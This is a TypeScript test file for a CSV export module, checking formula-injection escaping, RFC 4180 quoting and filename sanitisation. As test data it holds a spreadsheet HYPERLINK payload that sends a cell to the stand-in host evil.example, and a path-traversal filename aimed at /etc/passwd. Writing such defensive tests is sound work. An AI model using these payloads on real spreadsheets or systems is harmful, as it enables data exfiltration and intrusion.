import { describe, expect, test } from "vitest"

import { csvFilename, escapeCsvCell, toCsv } from "@/lib/csv"

describe("escapeCsvCell — formula injection", () => {
  // These are the real attack: a spreadsheet executes a cell starting with one
  // of these characters, so an unescaped post title can exfiltrate the sheet.
  test.each(["=", "+", "-", "@", "\t", "\r"])("neutralises a cell starting with %j", (trigger) => {
    const payload = `${trigger}HYPERLINK("http://evil.example/?d="&A1,"Click")`

    const result = escapeCsvCell(payload)

    expect(result.replace(/^"/, "")).toMatch(/^'/)
  })

  test("prefixes a quote so the spreadsheet treats it as literal text", () => {
    expect(escapeCsvCell("=1+1")).toBe("'=1+1")
  })

  test("leaves an ordinary value untouched", () => {
    expect(escapeCsvCell("Behind the scenes")).toBe("Behind the scenes")
  })

  test("does not treat a negative number as a formula trigger by accident", () => {
    // A leading "-" is quoted, which is correct: Excel would evaluate it.
    // The value must still round-trip as readable text.
    expect(escapeCsvCell(-42)).toBe("'-42")
  })
})

describe("escapeCsvCell — RFC 4180 quoting", () => {
  test("quotes a value containing a comma", () => {
    expect(escapeCsvCell("Jakarta, Indonesia")).toBe('"Jakarta, Indonesia"')
  })

  test("doubles inner quotes", () => {
    expect(escapeCsvCell('He said "hello"')).toBe('"He said ""hello"""')
  })

  test("quotes a value containing a newline", () => {
    expect(escapeCsvCell("line one\nline two")).toBe('"line one\nline two"')
  })

  test("renders null and undefined as an empty cell", () => {
    expect(escapeCsvCell(null)).toBe("")
    expect(escapeCsvCell(undefined)).toBe("")
  })
})

describe("toCsv", () => {
  const rows = [
    { name: "Alya", score: 92 },
    { name: "Bima, Jr", score: 78 },
  ]
  const columns = [
    { header: "Name", value: (row: (typeof rows)[number]) => row.name },
    { header: "Score", value: (row: (typeof rows)[number]) => row.score },
  ]

  test("emits a header row followed by the data rows", () => {
    const csv = toCsv(rows, columns)
    const lines = csv.replace(/^﻿/, "").split("\r\n")

    expect(lines[0]).toBe("Name,Score")
    expect(lines[1]).toBe("Alya,92")
    expect(lines[2]).toBe('"Bima, Jr",78')
  })

  test("starts with a BOM so Excel reads it as UTF-8", () => {
    expect(toCsv(rows, columns).startsWith("﻿")).toBe(true)
  })

  test("uses CRLF line endings per RFC 4180", () => {
    expect(toCsv(rows, columns)).toContain("\r\n")
  })

  test("emits header-only output for an empty dataset", () => {
    expect(toCsv([], columns).replace(/^﻿/, "")).toBe("Name,Score")
  })
})

describe("csvFilename", () => {
  test("builds a name from the dataset and range", () => {
    expect(csvFilename("posts", "2026-01-01", "2026-01-31")).toBe(
      "posts_2026-01-01_to_2026-01-31.csv"
    )
  })

  test("strips characters that could break out of the header or traverse a path", () => {
    const filename = csvFilename('../../etc/passwd"; drop', "2026-01-01", "2026-01-31")

    expect(filename.endsWith(".csv")).toBe(true)

    // Assert on the base only — the ".csv" extension legitimately has a dot.
    const base = filename.slice(0, -".csv".length)
    expect(base).not.toContain("/")
    expect(base).not.toContain('"')
    expect(base).not.toContain(".")
    expect(base).not.toContain(";")
  })

  test("falls back to a default when the base sanitises to nothing", () => {
    expect(csvFilename("///", "2026-01-01", "2026-01-31")).toBe(
      "export_2026-01-01_to_2026-01-31.csv"
    )
  })
})
